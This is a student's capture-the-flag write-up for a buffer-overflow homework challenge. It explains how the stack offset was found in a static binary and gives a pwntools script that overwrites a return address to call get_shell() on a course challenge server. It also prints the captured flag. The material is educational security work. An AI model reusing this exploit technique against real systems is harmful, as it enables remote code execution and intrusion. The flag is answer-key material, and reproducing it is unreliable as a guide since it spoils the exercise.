# 5. write-up (buffer overflows)

## bof-50
**Solve:**
Run `readelf -h bof` to gain basic info on the compiled binary. We notice it's a static binary and no-PIE, which means all the symbols addresses are absolute rather than offsets. 

Use Binja for static analysis. The goal is to map out the program. Entering Binja, we see there's a main() function that allocates a buffer and prompts for user input. Looking around, we notice an interesting function called get_shell(). It pops a shell for us. Our goal is to call this function by overwriting the return address when the program prompts for user input, because then, we can take control of the remote server. 

Open up stack view of main's stack frame on Binja, and we notice that the buffer is at an offset of 0x28 bytes before the return address. This means we should enter 0x28 bytes of any character, and immediately enter the address of get_shell() such that it overwrites precisely the return address. 

We'll write a python script for this exploit. For sending the address of get_shell, we use p64(), which accepts a hex address, encodes it in little-endian by default, and pads the rest of it with zeroes so the whole address is 8 bytes long. Little-endian is desired as return addresses are interpreted as numbers, which are read in little-endian in our case. 

Python script is shown here:
```python
from pwn import *
print("before ELF line")
p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1280)

p.recvuntil("123): ".encode()) # .encode() turns str into raw bytes
p.sendline("hw3172")
p.recvuntil("> ".encode())
p.sendline(b"B"*0x28 + p64(0x401218))
# ^ same as: p.sendline(b"B"*0x28 + b"\x18\x12\x40\x00\x00\x00\x00\x00")
# p64() sends the addr in little-endian and pads it with zeroes until it's
# 8 bytes full
p.interactive()
```

**Flag:**
flag{Sm4sh1ng_Th3_St4ck_m0stly_f0r_fUn!_a82ea14bef65b164}

**Summary:**
- flow: unchecked buffer on stack --> use user input to overwrite return addr to call an interesting function called get_shell(), which pops a shell for us on the remote system --> run `ls` to see files --> notice flag.txt --> `cat flag.txt` to see its content
- concepts: - memory layout - function prologue - `call` instruction before function prologue
- techniques: - when you overwrite the return addr, make sure your sent-in return addr is complete. This means if the target architecture is 64-bits (8 bytes) where memory addrs are encoded with 8 bytes, your sent-in addr should also be 8 bytes. This implies padding the end with zeroes may be required.
- problems: ELF takes up too much memory on Amazon VM and quits script. That's why I'm manually writing get_shell's address instead of using p64
